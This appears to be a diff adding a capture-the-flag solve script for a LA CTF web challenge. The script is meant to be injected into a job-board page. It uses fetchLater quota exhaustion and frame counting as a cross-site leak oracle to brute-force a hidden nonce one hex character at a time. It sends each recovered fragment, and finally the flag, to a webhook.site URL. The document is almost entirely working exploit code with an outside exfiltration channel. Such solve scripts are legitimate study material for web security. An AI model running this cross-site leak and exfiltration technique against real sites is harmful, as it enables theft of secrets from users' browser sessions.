@@ -1,0 +1,203 @@
+&<>"'
+<!-- Inject into https://job-board.chall.lac.tf/ -->
+<script type="module">
+const target = 'https://notes-revenge-hrrso.instancer.lac.tf';
+const webhook = 'https://webhook.site/90e9d494-e020-4e95-bf16-59b969c21632';
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function log(msg) {
+    console.log(msg);
+    await fetch(`${webhook}?msg=${encodeURIComponent(msg)}`, { mode: "no-cors" });
+}
+
+async function waitFor(checkCond) {
+    while (!checkCond()) {
+        await sleep(10);
+    }
+}
+
+function fill1KiBQuota(url) {
+    // Create a request to use 1 KiB (1024 bytes) of the shared quota
+    fetchLater(url, {
+        method: "POST",
+        body: "a".repeat(1024 - url.length - 49),
+    });
+}
+
+function fillDelegatedSubframeQuota(url) {
+    // Each cross-origin subframe gets an 8KiB quota out of the shared 128KiB quota by default.
+    // A subframe with delegated quota from the top level quota gets a 64 KiB quota.
+    for (let i = 0; i < 64; i++) {
+        fill1KiBQuota(url);
+    }
+}
+
+function countFakeIframes() {
+    const urls = [
+        "https://a.example.com",
+        "https://b.example.com",
+        "https://c.example.com",
+        "https://d.example.com",
+        "https://e.example.com",
+        "https://f.example.com",
+        "https://g.example.com",
+        "https://h.example.com"
+    ];
+
+    // The top level quota is 512 KiB. It is able to delegate 512 KiB / 64 KiB quota per subframe = 8 subsubframes maximum
+    for (let i = 0; i < 8; i++) {
+        try {
+            fillDelegatedSubframeQuota(urls[i]);
+        } catch (exception) {
+            if (exception instanceof QuotaExceededError) {
+                return 8 - i;
+            }
+        }
+    }
+
+    return 0;
+}
+
+async function oracle(guess) {
+    const payload = `${target}?allow=foo&referrerPolicy=deferred-fetch&search=${encodeURIComponent(guess)}`;
+
+    const iframe = document.createElement("iframe");
+    iframe.src = payload;
+    iframe.allow = "deferred-fetch";
+    document.body.appendChild(iframe);
+
+    await waitFor(() => window.frames[0].length !== 0);
+
+    let totalFrames = window.frames[0].length;
+    while (totalFrames >= 8 || totalFrames < 6) {
+        iframe.src = "about:blank";
+        await waitFor(() => window.frames[0].length === 0);
+        iframe.src = payload;
+        await waitFor(() => window.frames[0].length !== 0);
+        totalFrames = window.frames[0].length;
+    }
+
+    const fakeIframes = countFakeIframes();
+    const realFrames = totalFrames - fakeIframes + 1;
+    const res = realFrames > 0;
+    iframe.remove();
+    return res;
+}
+
+let ws;
+
+async function createFrames(size) {
+    ws = Array(size).fill(0).map((_, i) => window.open(
+        "about:blank",
+        i,
+        `width=1,height=1,top=${((1 + Math.floor(i / 10)) * 200)},left=${(i % 10) * 150}`,
+    ));
+
+    await waitFor(() => ws.every((w) => w.length === 0));
+}
+
+const alpha = '0123456789abcdef';
+const BATCH_SIZE = alpha.length / 2;
+await createFrames(BATCH_SIZE);
+
+async function shim(i, guess) {
+    const w = ws[i % BATCH_SIZE];
+    
+    const res = document.createElement("div");
+    res.id = "result";
+    w.document.body.appendChild(res);
+
+    const g = document.createElement("div");
+    g.id = "g";
+    g.innerText = guess;
+    w.document.body.appendChild(g);
+
+    const script = document.createElement("script");
+    script.type = "module";
+    script.innerHTML = `
+const target = "${target}";
+
+${sleep.toString()}
+
+${waitFor.toString()}
+
+${fill1KiBQuota.toString()}
+
+${fillDelegatedSubframeQuota.toString()}
+
+${countFakeIframes.toString()}
+
+${oracle.toString()}
+
+window.result.innerHTML = await oracle("${guess}");
+`;
+
+    w.document.body.appendChild(script);
+
+    let result;
+    await waitFor(() => {
+        result = w.result?.innerHTML;
+        return result?.length > 0;
+    });
+
+    const ret = eval(result);
+
+    // await log(`${guess} ${ret}`);
+
+    if (!ret) {
+        throw new Error(`${guess} did not work!`);
+    }
+
+    return i;
+}
+
+let nonce = '';
+while (nonce.length !== 8) {
+    const pErr = new Promise((resolve, reject) => {
+        reject(new Error("Always fails"));
+    });
+
+    let results = Array(alpha.length).fill(pErr);
+    let idx;
+
+    let curr = 0;
+    for (let i = 0; i < alpha.length; i += 1) {
+        const guess = nonce + alpha[i];
+        results[i] = shim(i, guess);
+        curr++;
+
+        if (curr >= BATCH_SIZE) {
+            idx = await Promise.any(results).catch((e) => console.log(e));
+            curr = 0;
+
+            if (idx === undefined) {
+                ws.map((w) => w.location.reload());
+                await waitFor(() => ws.every((w) => w.result === undefined));
+            }
+        }
+
+        if (idx !== undefined) {
+            break;
+        }
+    }
+
+    if (idx === undefined) {
+        idx = await Promise.any(results);
+    }
+    nonce += alpha[idx];
+
+    await log(nonce);
+
+    ws.map((w) => w.location.reload());
+    await waitFor(() => ws.every((w) => w.result === undefined));
+}
+
+ws.map(w => w.close());
+
+const res = await fetch(`${target}/guess?nonce=${nonce}`);
+const flag = await res.text();
+await log(flag);
+</script>
